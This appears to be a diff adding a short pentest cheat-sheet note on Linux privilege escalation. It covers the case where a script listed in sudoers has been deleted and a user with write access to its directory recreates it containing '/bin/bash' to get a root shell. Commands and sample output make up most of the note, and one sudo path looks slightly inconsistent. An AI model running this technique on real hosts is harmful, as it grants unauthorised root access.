@@ -1,0 +1,48 @@
+Missing script in sudoers file
+###############################
+
+This scenario is when a script was definned in the sudoers file but has been deleted.
+The current user is also the owner of the directory or is set to public
+
+To check manually :
+
+$ ls -ld /directory
+drwxr-xr-x 2 current_user current_group 4096 Oct  3 13:58 /directory
+
+$ ls -l /directory
+total 4
+-rwxr-xr-x 1 root     root             37 Oct  3 14:06 restart.sh
+-rwxr-xr-x 1 current_user current_user 53 Oct  3 14:03 start.sh
+
+From the e.g. above, the current user can list the directory with ls (r), create a file or sub-directory (w) and access the directory with cd (x).
+
+
+$ sudo -l
+[sudo] password for current_user:
+User current_user may run the following commands on this host:
+    (root) /directory/start.sh, (root) /directory/stop.sh, 
+    (root) /directory/restart.sh, (root) /usr/sbin/lsof
+
+
+Since the current user can create a file in the directory, /directory
+
+1. Create a file with the same filename as the missing one
+$ touch stop.sh
+$ echo "/bin/bash" >> stop.sh
+
+2. Run the created script
+$ chmod +x stop.sh
+$ sudo ./directory/stop.sh
+
+
+ r- ls on directory / w- create file + directory / x- access the directory *cd
+
+
+
+
+
+
+
+
+
+
